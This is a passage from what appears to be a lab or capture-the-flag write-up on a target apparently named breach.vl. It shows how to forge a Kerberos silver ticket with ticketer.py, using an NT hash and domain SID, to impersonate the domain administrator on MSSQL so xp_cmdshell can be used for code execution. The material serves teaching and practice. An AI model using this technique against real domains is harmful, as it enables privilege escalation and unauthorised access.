### Silver Ticket

MSSQL service can lead to RCE using `xp_cmdshell`, let's see if we have to right for that.

![alt text](/assets/images/breach/7.png)

We don't have the right infortunately... BUT, we can impersonate someone who has it! \
We can make a silver ticket, to connect to MSSQL service has a Domain Administrator. 
```bash
ticketer.py -nthash "69596C7AA1E8DAEE17F8E78870E25A5C" -spn "MSSQLSvc/breachdc.breach.vl" -domain-sid "S-1-5-21-2330692793-3312915120-706255856" -domain "breach.vl" -user-id 500 administrator
```
